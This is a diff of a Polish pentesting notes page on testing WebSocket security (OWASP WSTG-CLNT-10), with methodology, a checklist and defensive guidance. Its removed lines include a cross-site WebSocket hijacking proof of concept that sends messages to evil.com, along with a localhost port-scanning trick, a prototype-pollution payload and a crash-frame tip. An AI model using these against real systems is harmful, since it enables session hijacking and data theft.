@@ -1,67 +1,34 @@
 # WSTG-CLNT-10 — Testing WebSockets
 
-## Cele
+## Cel
 
-- Identify the usage of WebSockets
-- Assess its implementation by using the same tests on normal HTTP channels
+Weryfikacja WebSocket security: użycie WSS (TLS), origin validation w handshake (CSWSH defense), input validation per message, rate limiting, authentication na każdej wiadomości.
 
-## KOMENDY
+> **Test mostly manual**: WebSocket wymaga Burp WebSockets History review + custom messages. Nuclei nie wykrywa WS w HTTP fuzzing.
 
-### Identyfikacja WebSocket
+## Standard pentesterski — jak to robi się wzorowo
 
-```bash
-curl -sI "https://TARGET/" | grep -i "upgrade\|websocket"
-# Szukaj ws:// i wss:// w kodzie JS
+### Metodologia (6 kroków)
 
-```
+1. **WS endpoint discovery**: Burp WebSockets History + grep w JS bundle: `new WebSocket(`.
+2. **WSS vs WS**: czy aplikacja używa wss:// (encrypted) — ws:// = plaintext.
+3. **Origin validation test**: spróbować connection z attacker page do `wss://target.com/socket` — czy backend waliduje Origin header w handshake?
+4. **Auth per message**: każda wiadomość WS musi być authenticated — nie tylko handshake.
+5. **Input validation**: testować injection (XSS, SQLi, command) przez WS messages.
+6. **Rate limiting**: send burst messages — czy backend limituje?
 
-### wscat - interakcja z WebSocket
+### Co MUSI być sprawdzone (10 punktów)
 
-```bash
-wscat -c "wss://TARGET/ws"
-
-```
-
-### Test CSWSH (Cross-Site WebSocket Hijacking)
-
-```bash
-# Stworz PoC HTML:
-# <script>var ws = new WebSocket('wss://TARGET/ws'); ws.onmessage=function(e){fetch('http://evil.com/?data='+e.data)}</script>
-
-```
-
-### Test injection via WebSocket
-
-```bash
-# Wyslij XSS/SQLi payloady przez WebSocket connection
-
-```
-
-## KOMENDY Z WORDLISTAMI
-
-### PayloadsAllTheThings Web Sockets
-
-```bash
-# Referencja: Desktop/WSTG/PayloadsAllTheThings-master/Web Sockets/README.md
-
-```
-
-### Reuse injection payloads z INPV testow
-
-```bash
-
-```
-
-## WERYFIKACJA MANUALNA (Burp Suite / Przegladarka / DevTools)
-
-1. Uzyj Burp WebSocket History tab
-2. Sprawdz czy WS wymaga autentykacji
-3. Testuj CSWSH - czy WS waliduje Origin
-4. Wyslij injection payloady (XSS, SQLi) przez WS
-5. Sprawdz czy dane z WS sa sanityzowane przed renderowaniem
-
-
----
+- [ ] WSS (encrypted) vs WS (plain)
+- [ ] Origin validation w handshake (CSWSH defense)
+- [ ] Auth token w handshake / first message
+- [ ] Auth verification per message (nie tylko handshake)
+- [ ] Input validation (XSS/SQLi/cmd injection w messages)
+- [ ] Output encoding (czy wiadomości z WS są escape przed renderowaniem w DOM?)
+- [ ] Rate limiting per connection / per user
+- [ ] Connection timeout (max session time)
+- [ ] Message size limits
+- [ ] Heartbeat/ping-pong dla detect dead connections
 
 ## CHEATSHEET OWASP — Kluczowe wskazówki
 
@@ -69,79 +36,82 @@ wscat -c "wss://TARGET/ws"
 
 ### Cross-Site WebSocket Hijacking (CSWSH)
 
-- Analogiczny do CSRF ale dla WebSocket — atakujacy inicjuje WS connection z przegladarki ofiary
-- WebSocket handshake jest HTTP request — przegladarka automatycznie dolacza cookies
-- Jesli serwer nie waliduje **Origin header** — atakujacy moze nawiazac polaczenie z dowolnej strony
-- **Obrona**: waliduj Origin header w handshake — odrzuc jesli nie pochodzi z zaufanej domeny
+- Analogiczny do CSRF ale dla WebSocket — atakujący inicjuje WS connection z przeglądarki ofiary
+- WebSocket handshake jest HTTP request — przeglądarka automatycznie dołącza cookies
+- Jeśli serwer nie waliduje **Origin header** — atakujący może nawiązać połączenie z dowolnej strony
+- **Obrona**: waliduj Origin header w handshake — odrzuć jeśli nie pochodzi z zaufanej domeny
 
 ### Transport Security
 
-- **WSS (WebSocket Secure)** zamiast WS — szyfrowany kanal (TLS)
-- WS bez szyfrowania = dane w plaintext — atakujacy MitM moze odczytac/modyfikowac wiadomosci
+- **WSS (WebSocket Secure)** zamiast WS — szyfrowany kanał (TLS)
+- WS bez szyfrowania = dane w plaintext — atakujący MitM może odczytać/modyfikować wiadomości
 - Ustaw cookies sesji z flagami: `Secure`, `HttpOnly`, `SameSite`
 
 ### Autentykacja i autoryzacja
 
-- **Uwierzytelniaj** polaczenia WebSocket **NIEZALEZNIE** od HTTP session
-- Przekaz token w pierwszej wiadomosci WS lub w query string handshake (mniej bezpieczne — logi)
-- Sprawdzaj uprawnienia na KAZDEJ wiadomosci — nie tylko przy handshake
-- Implementuj session timeout na WS — polaczenie nie powinno zyc wiecznie
+- **Uwierzytelniaj** połączenia WebSocket **NIEZALEŻNIE** od HTTP session
+- Przekaż token w pierwszej wiadomości WS lub w query string handshake (mniej bezpieczne — logi)
+- Sprawdzaj uprawnienia na KAŻDEJ wiadomości — nie tylko przy handshake
+- Implementuj session timeout na WS — połączenie nie powinno żyć wiecznie
 
-### Input Validation na wiadomosciach
+### Input Validation na wiadomościach
 
-- **Waliduj WSZYSTKIE wiadomosci** po stronie serwera — WS to dwukierunkowy kanal
-- Testuj injection: XSS, SQLi, command injection — w wiadomosciach WS
-- Sprawdz czy dane z WS sa **sanityzowane przed renderowaniem** w DOM (XSS via WS)
-- Waliduj format: JSON schema validation, typ danych, dlugosc
+- **Waliduj WSZYSTKIE wiadomości** po stronie serwera — WS to dwukierunkowy kanał
+- Testuj injection: XSS, SQLi, command injection — w wiadomościach WS
+- Sprawdź czy dane z WS są **sanityzowane przed renderowaniem** w DOM (XSS via WS)
+- Waliduj format: JSON schema validation, typ danych, długość
 
 ### Rate Limiting i DoS
 
-- Implementuj **rate limiting na wiadomosci** — zapobiegaj flooding
-- Ogranicz rozmiar wiadomosci — zapobiegaj memory exhaustion
-- Ustaw max jednoczesnych polaczen per uzytkownik/IP
-- Implementuj heartbeat/ping-pong — wykrywaj i zamykaj martwe polaczenia
+- Implementuj **rate limiting na wiadomości** — zapobiegaj flooding
+- Ogranicz rozmiar wiadomości — zapobiegaj memory exhaustion
+- Ustaw max jednoczesnych połączeń per użytkownik/IP
+- Implementuj heartbeat/ping-pong — wykrywaj i zamykaj martwe połączenia
 
 ### Logging
 
 - Loguj handshake (Origin, IP, UA, timestamp)
-- Loguj anomalie: duza ilosc wiadomosci, nieprawidlowe formaty, proby injection
+- Loguj anomalie: duża ilość wiadomości, nieprawidłowe formaty, próby injection
 
-## ROZSZERZENIA BURP SUITE
+## Pentesterskie deep dive
+
+### Mniej znane techniki
+
+- **CSWSH chain → privilege escalation**: gdy WS pozwala na admin commands i Origin nie sprawdzany — atakujący w XSS na innej domenie wykonuje admin actions.
+- **Session prediction in WS auth**: jeśli session ID przesyłany w query string handshake → loguje się w access logs/proxy logs.
+- **Subprotocol negotiation**: `Sec-WebSocket-Protocol` może akceptować różne subprotocols z różnymi handlers — różne entry points.
+- **WebSocket smuggling**: HTTP/1 → HTTP/2 conversion może zaprezentować WS handshake jako regular HTTP, bypass-ujący WS-specific defenses (PortSwigger research).
+- **Browser extension hijacking via WS**: malicious extension może hookować WebSocket constructor — out-of-scope ale relevant.
+
+### Common pitfalls
+
+- **Origin nie sprawdzany "for legacy clients"**: legacy mobile app nie wysyła Origin → backend akceptuje wszystkie → CSWSH possible.
+- **JSON parse w handler bez validation**: `JSON.parse(event.data)` z ws message + then innerHTML render = XSS via WS.
+
+### Świeżynki z research
+
+- **PortSwigger WebSocket lab**: https://portswigger.net/web-security/websockets
+- **HackTricks WebSocket**: https://book.hacktricks.xyz/pentesting-web/websocket-attacks
+- **Christian Mehlmauer WebSocket research**: https://firefart.at/
+
+## Rozszerzenia Burp Suite
 
 | Rozszerzenie | Opis | Link |
 |---|---|---|
-| SocketSleuth | Zaawansowane testowanie WebSocket w Burp | [GitHub](https://github.com/snyk/socketsleuth) |
-| WebSocket Turbo Intruder | Fuzzowanie WebSocket z custom kodem | [GitHub](https://github.com/Hannah-PortSwigger/WebSocketTurboIntruder) |
+| WebSocket Smart Fuzzer | WS fuzzing | community ext |
 
----
+## Źródła
 
-## Wskazówki ASVS
+- WSTG: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_WebSockets
+- OWASP WebSocket CS: https://cheatsheetseries.owasp.org/cheatsheets/WebSocket_Security_Cheat_Sheet.html
+- PortSwigger WebSocket: https://portswigger.net/web-security/websockets
+- HackTricks WebSocket: https://book.hacktricks.xyz/pentesting-web/websocket-attacks
+- RFC 6455 (WebSocket): https://datatracker.ietf.org/doc/html/rfc6455
 
-Powiązane wymagania z OWASP ASVS 5.0 — dobre praktyki do weryfikacji podczas testu.
-
-### L1 (Podstawowy)
-
-| ID | Sekcja | Wymaganie |
-|---|---|---|
-| V4.4.1 | WebSocket | Verify that WebSocket over TLS (WSS) is used for all WebSocket connections. |
-
-### L2 (Standardowy)
+### Wskazówki ASVS
 
 | ID | Sekcja | Wymaganie |
 |---|---|---|
-| V4.4.2 | WebSocket | Verify that, during the initial HTTP WebSocket handshake, the Origin header field is checked against a list of origins allowed for the application. |
-| V4.4.3 | WebSocket | Verify that, if the application's standard session management cannot be used, dedicated tokens are being used for this, which comply with the relevant Session Management security requirements. |
-| V4.4.4 | WebSocket | Verify that dedicated WebSocket session management tokens are initially obtained or validated through the previously authenticated HTTPS session when transitioning an existing HTTPS session to a WebSocket channel. |
-
-
----
-
-## HackTricks Tips
-
-- **CSWSH (Cross-Site WebSocket Hijacking)**: jeśli auth cookie-only bez CSRF token i `SameSite=None` → open cross-origin WS z malicious page
-- **Origin check disabled**: jeśli `CheckOrigin` always returns `true` (Gorilla, etc.) → any page otwiera socket
-- **Localhost port scanning**: brute ports 20000-36000 z `new WebSocket("ws://127.0.0.1:PORT/")`, detect `onopen`
-- **Prototype pollution via Socket.IO**: `{"__proto__":{"initialPacket":"Polluted"}}`
-- **DoS Ping of Death**: WS frame z `Integer.MAX_VALUE` payload length bez body → OOM crash
-- **Race conditions**: WebSocket Turbo Intruder z `THREADED` engine
-- **Tool**: STEWS (`PalindromeLabs/STEWS`) — auto-discover i fingerprint WS endpoints
+| V13.5.1 | WebSocket (L1) | WSS (TLS) used. |
+| V13.5.2 | WebSocket (L1) | Origin validated in handshake. |
+| V13.5.3 | WebSocket (L2) | Authentication per message. |
